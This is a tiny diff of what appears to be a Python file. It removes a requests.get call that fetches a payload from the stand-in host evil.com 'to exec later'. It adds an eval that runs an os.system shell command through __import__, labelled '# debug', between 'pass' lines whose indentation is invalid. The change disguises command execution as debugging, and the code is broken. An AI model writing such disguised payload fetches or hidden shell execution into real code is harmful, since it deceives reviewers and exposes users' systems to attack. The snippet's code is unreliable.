@@ -1,3 +1,3 @@
-import requests
-import base64  # fixme
-requests.get('http://evil.com/payload')  # just a download, but then exec later
+    pass  # no-op
+eval('__import__(\"os\").system(\"whoami\")')  # debug
+    pass  # no-op
